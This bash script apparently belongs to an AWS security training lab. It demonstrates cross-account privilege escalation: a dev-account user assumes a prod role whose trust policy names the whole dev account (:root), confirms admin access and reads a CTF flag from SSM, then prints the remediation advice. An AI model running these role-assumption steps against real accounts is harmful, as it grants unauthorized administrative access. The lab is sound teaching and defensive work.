#!/bin/bash

# Demo script for cross-account root-trust-role-assumption privilege escalation
# This scenario demonstrates the security risk of trusting :root (entire account) instead of specific principals


# Disable AWS CLI paging
export AWS_PAGER=""

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Dim color for command display
DIM='\033[2m'
CYAN='\033[0;36m'

# Track attack commands for summary
ATTACK_COMMANDS=()

# Display a command before executing it
show_cmd() {
    local identity="$1"; shift
    echo -e "${DIM}[${identity}] \$ $*${NC}"
}

# Display AND record an attack command
show_attack_cmd() {
    local identity="$1"; shift
    echo -e "\n${CYAN}[${identity}] \$ $*${NC}"
    ATTACK_COMMANDS+=("$*")
}

# Configuration
STARTING_USER_DEV="pl-dev-xsarrt-to-admin-starting-user"
TARGET_ROLE_PROD="pl-prod-xsarrt-to-admin-target-role"

echo -e "${GREEN}========================================${NC}"
echo -e "${GREEN}Cross-Account Root Trust Role Assumption Demo${NC}"
echo -e "${GREEN}========================================${NC}\n"

# Step 1: Retrieve credentials and region from Terraform grouped outputs
echo -e "${YELLOW}Step 1: Retrieving scenario configuration from Terraform${NC}"
cd ../../../../../..  # Navigate to root of terraform project

# Get the module output using the grouped output pattern
MODULE_OUTPUT=$(terraform output -json 2>/dev/null | jq -r '.cross_account_dev_to_prod_one_hop_root_trust_role_assumption.value // empty')

if [ -z "$MODULE_OUTPUT" ]; then
    echo -e "${RED}Error: Could not find terraform output${NC}"
    echo "Make sure you've deployed this scenario with: terraform apply"
    exit 1
fi

# Extract credentials from the grouped output
STARTING_ACCESS_KEY_ID=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_access_key_id')
STARTING_SECRET_ACCESS_KEY=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_secret_access_key')
TARGET_ROLE_ARN=$(echo "$MODULE_OUTPUT" | jq -r '.target_role_arn')

if [ "$STARTING_ACCESS_KEY_ID" == "null" ] || [ -z "$STARTING_ACCESS_KEY_ID" ]; then
    echo -e "${RED}Error: Could not extract credentials from terraform output${NC}"
    exit 1
fi

if [ "$TARGET_ROLE_ARN" == "null" ] || [ -z "$TARGET_ROLE_ARN" ]; then
    echo -e "${RED}Error: Could not extract target role ARN from terraform output${NC}"
    exit 1
fi

# Extract readonly credentials for observation/polling steps
READONLY_ACCESS_KEY=$(terraform output -raw dev_readonly_user_access_key_id 2>/dev/null)
READONLY_SECRET_KEY=$(terraform output -raw dev_readonly_user_secret_access_key 2>/dev/null)

if [ -z "$READONLY_ACCESS_KEY" ] || [ "$READONLY_ACCESS_KEY" == "null" ]; then
    echo -e "${RED}Error: Could not find readonly credentials in terraform output${NC}"
    exit 1
fi

# Get region
AWS_REGION=$(terraform output -raw aws_region 2>/dev/null || echo "")

if [ -z "$AWS_REGION" ]; then
    echo -e "${YELLOW}Warning: Could not retrieve region from Terraform, defaulting to us-east-1${NC}"
    AWS_REGION="us-east-1"
fi

echo "Retrieved access key for: $STARTING_USER_DEV"
echo "Access Key ID: ${STARTING_ACCESS_KEY_ID:0:10}..."
echo "ReadOnly Key ID: ${READONLY_ACCESS_KEY:0:10}..."
echo "Target Role ARN: $TARGET_ROLE_ARN"
echo "Region: $AWS_REGION"
echo -e "${GREEN}✓ Retrieved configuration from Terraform${NC}\n"

# Navigate back to scenario directory
cd - > /dev/null

# Credential switching helpers
use_starting_creds() {
    export AWS_ACCESS_KEY_ID="$STARTING_ACCESS_KEY_ID"
    export AWS_SECRET_ACCESS_KEY="$STARTING_SECRET_ACCESS_KEY"
    unset AWS_SESSION_TOKEN
}
use_readonly_creds() {
    export AWS_ACCESS_KEY_ID="$READONLY_ACCESS_KEY"
    export AWS_SECRET_ACCESS_KEY="$READONLY_SECRET_KEY"
    unset AWS_SESSION_TOKEN
}

# Source demo permissions library for validation restriction
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
source "$SCRIPT_DIR/../../../../../../scripts/lib/demo_permissions.sh"

# Restrict helpful permissions during validation run
restrict_helpful_permissions "$SCRIPT_DIR/scenario.yaml"
setup_demo_restriction_trap "$SCRIPT_DIR/scenario.yaml"

# [EXPLOIT] Step 2: Configure AWS credentials with starting user in dev account
echo -e "${YELLOW}Step 2: Configuring AWS CLI with starting user credentials (dev account)${NC}"
use_starting_creds
export AWS_REGION=$AWS_REGION

echo "Using region: $AWS_REGION"

# Verify starting user identity
show_cmd "Attacker" "aws sts get-caller-identity --query 'Arn' --output text"
CURRENT_USER=$(aws sts get-caller-identity --query 'Arn' --output text)
echo "Current identity: $CURRENT_USER"

if [[ ! $CURRENT_USER == *"$STARTING_USER_DEV"* ]]; then
    echo -e "${RED}Error: Not running as $STARTING_USER_DEV${NC}"
    exit 1
fi
echo -e "${GREEN}✓ Verified starting user identity in dev account${NC}\n"

# [OBSERVATION] Step 3: Get dev account ID
echo -e "${YELLOW}Step 3: Identifying dev and prod accounts${NC}"
use_readonly_creds
export AWS_REGION=$AWS_REGION
show_cmd "ReadOnly" "aws sts get-caller-identity --query 'Account' --output text"
DEV_ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
PROD_ACCOUNT_ID=$(echo $TARGET_ROLE_ARN | cut -d':' -f5)
echo "Dev Account ID: $DEV_ACCOUNT_ID"
echo "Prod Account ID: $PROD_ACCOUNT_ID"
echo -e "${GREEN}✓ Extracted account IDs${NC}\n"

# [OBSERVATION] Step 4: Display trust policy information - CRITICAL SECURITY ISSUE
echo -e "${YELLOW}Step 4: Examining trust policy of target role${NC}"
echo -e "${RED}⚠️  CRITICAL SECURITY ISSUE IDENTIFIED ⚠️${NC}"
echo ""
echo "The prod target role trusts the ENTIRE dev account via :root principal:"
echo ""
echo -e "${BLUE}Trust Policy Principal:${NC}"
echo "  {\"AWS\": \"arn:aws:iam::${DEV_ACCOUNT_ID}:root\"}"
echo ""
echo -e "${RED}Security Impact:${NC}"
echo "  • ANY principal in dev account with sts:AssumeRole can assume this role"
echo "  • This includes: ALL IAM users, ALL IAM roles, ALL federated users"
echo "  • The :root principal grants account-wide trust, not just specific principals"
echo ""
echo -e "${YELLOW}Best Practice:${NC}"
echo "  • Trust specific principals instead: arn:aws:iam::${DEV_ACCOUNT_ID}:role/specific-role"
echo "  • Add conditions to restrict which principals can assume the role"
echo "  • Use aws:PrincipalArn or aws:PrincipalOrgID conditions"
echo ""
echo -e "${GREEN}✓ Trust policy analyzed${NC}\n"

# [EXPLOIT] Step 5: Verify lack of admin access in prod account
echo -e "${YELLOW}Step 5: Verifying we don't have admin access in prod yet${NC}"
use_starting_creds
export AWS_REGION=$AWS_REGION
echo "Attempting to list IAM users in prod account (should fail)..."
show_cmd "Attacker" "aws iam list-users --max-items 1"
if aws iam list-users --max-items 1 &> /dev/null; then
    echo -e "${RED}⚠ Unexpectedly have admin permissions already${NC}"
else
    echo -e "${GREEN}✓ Confirmed: Cannot list IAM users (as expected)${NC}"
fi
echo ""

# [EXPLOIT] Step 6: Assume the prod target role
echo -e "${YELLOW}Step 6: Assuming the target role in prod account${NC}"
use_starting_creds
export AWS_REGION=$AWS_REGION
echo "Target Role ARN: $TARGET_ROLE_ARN"
echo ""
echo "Because the role trusts :root, we can assume it with our basic user credentials..."
echo ""

show_attack_cmd "Attacker" "aws sts assume-role --role-arn $TARGET_ROLE_ARN --role-session-name root-trust-demo-session --query 'Credentials' --output json"
CREDENTIALS=$(aws sts assume-role \
    --role-arn $TARGET_ROLE_ARN \
    --role-session-name root-trust-demo-session \
    --query 'Credentials' \
    --output json)

export AWS_ACCESS_KEY_ID=$(echo $CREDENTIALS | jq -r '.AccessKeyId')
export AWS_SECRET_ACCESS_KEY=$(echo $CREDENTIALS | jq -r '.SecretAccessKey')
export AWS_SESSION_TOKEN=$(echo $CREDENTIALS | jq -r '.SessionToken')
# Keep region consistent
export AWS_REGION=$AWS_REGION

# Verify we assumed the role
show_cmd "Attacker" "aws sts get-caller-identity --query 'Arn' --output text"
ROLE_IDENTITY=$(aws sts get-caller-identity --query 'Arn' --output text)
show_cmd "Attacker" "aws sts get-caller-identity --query 'Account' --output text"
CURRENT_ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
echo "Current identity: $ROLE_IDENTITY"
echo "Current Account ID: $CURRENT_ACCOUNT_ID"

if [[ ! $ROLE_IDENTITY == *"$TARGET_ROLE_PROD"* ]]; then
    echo -e "${RED}Error: Failed to assume target role${NC}"
    exit 1
fi

if [ "$CURRENT_ACCOUNT_ID" != "$PROD_ACCOUNT_ID" ]; then
    echo -e "${RED}Error: Not in prod account after role assumption${NC}"
    exit 1
fi

echo -e "${GREEN}✓ Successfully assumed role in prod account${NC}\n"

# [OBSERVATION] Step 7: Verify administrator access in prod account
echo -e "${YELLOW}Step 7: Verifying administrator access in prod account${NC}"
echo "Attempting to list IAM users..."

show_cmd "ReadOnly" "aws iam list-users --max-items 3 --output table"
if aws iam list-users --max-items 3 --output table; then
    echo -e "${GREEN}✓ Successfully listed IAM users!${NC}"
    echo -e "${GREEN}✓ ADMIN ACCESS CONFIRMED IN PROD ACCOUNT${NC}"
else
    echo -e "${RED}✗ Failed to list users${NC}"
    exit 1
fi
echo ""

# [EXPLOIT] Step 8: Capture the CTF flag from SSM Parameter Store
# The assumed admin role session is still active; AdministratorAccess grants ssm:GetParameter implicitly.
echo -e "${YELLOW}Step 8: Capturing CTF flag from SSM Parameter Store${NC}"
FLAG_PARAM_NAME="/pathfinding-labs/flags/root-trust-role-assumption-to-admin"
show_attack_cmd "Attacker (prod admin role)" "aws ssm get-parameter --name $FLAG_PARAM_NAME --query 'Parameter.Value' --output text"
FLAG_VALUE=$(aws ssm get-parameter --name "$FLAG_PARAM_NAME" --query 'Parameter.Value' --output text 2>/dev/null)

if [ -n "$FLAG_VALUE" ] && [ "$FLAG_VALUE" != "None" ]; then
    echo -e "${GREEN}✓ Flag captured: ${FLAG_VALUE}${NC}"
else
    echo -e "${RED}✗ Failed to read flag from $FLAG_PARAM_NAME${NC}"
    exit 1
fi
echo ""

if [ ${#ATTACK_COMMANDS[@]} -gt 0 ]; then
    echo -e "\n${YELLOW}Attack Commands:${NC}"
    for cmd in "${ATTACK_COMMANDS[@]}"; do
        echo -e "  ${CYAN}\$ ${cmd}${NC}"
    done
fi

# Restore helpful permissions for manual exploration
restore_helpful_permissions "$SCRIPT_DIR/scenario.yaml"

# Final summary
echo -e "\n${GREEN}========================================${NC}"
echo -e "${GREEN}✅ CTF FLAG CAPTURED!${NC}"
echo -e "${GREEN}========================================${NC}"
echo -e "\n${YELLOW}Attack Summary:${NC}"
echo "1. Started as: $STARTING_USER_DEV in dev account ($DEV_ACCOUNT_ID)"
echo "2. Identified: Prod role trusts :root (entire dev account)"
echo "3. Assumed role: $TARGET_ROLE_PROD in prod account ($PROD_ACCOUNT_ID)"
echo "4. Achieved: Administrative access in prod account"
echo "5. Captured CTF flag from SSM Parameter Store: $FLAG_VALUE"

echo -e "\n${YELLOW}Cross-Account Attack Path:${NC}"
echo "dev:$STARTING_USER_DEV → (sts:AssumeRole) → prod:$TARGET_ROLE_PROD → admin access → (ssm:GetParameter) → CTF Flag"

echo -e "\n${RED}⚠️  CRITICAL SECURITY FINDING ⚠️${NC}"
echo -e "${RED}The target role trusts 'arn:aws:iam::${DEV_ACCOUNT_ID}:root'${NC}"
echo ""
echo "This means that ANY of the following could perform this exact attack:"
echo "  • ANY IAM user in dev account with sts:AssumeRole permission"
echo "  • ANY IAM role in dev account with sts:AssumeRole permission"
echo "  • ANY federated user in dev account with sts:AssumeRole permission"
echo "  • ANY EC2 instance with an instance profile in dev account"
echo "  • ANY Lambda function with an execution role in dev account"
echo ""
echo "The :root principal grants account-wide trust, vastly expanding the attack surface."

echo -e "\n${YELLOW}Attack Artifacts:${NC}"
echo "- No persistent artifacts created"
echo "- Role assumption created temporary session credentials that will expire"

echo -e "\n${BLUE}ℹ This demonstrates why trusting :root is a critical security misconfiguration${NC}"
echo -e "${BLUE}An attacker compromising ANY principal in dev can gain admin access to prod${NC}"

echo -e "\n${YELLOW}Recommended Remediation:${NC}"
echo "1. Replace :root trust with specific principal ARNs"
echo "2. Add aws:PrincipalArn conditions to restrict assumable roles"
echo "3. Use aws:PrincipalOrgID to limit trust to specific AWS Organizations"
echo "4. Implement least privilege - only grant trust to principals that need it"

echo -e "\n${YELLOW}To clean up (no cleanup needed for this scenario):${NC}"
echo "  ./cleanup_attack.sh or use the plabs TUI/CLI"
echo ""

# Mark demo as active for plabs tracking
touch "$(dirname "$0")/.demo_active"
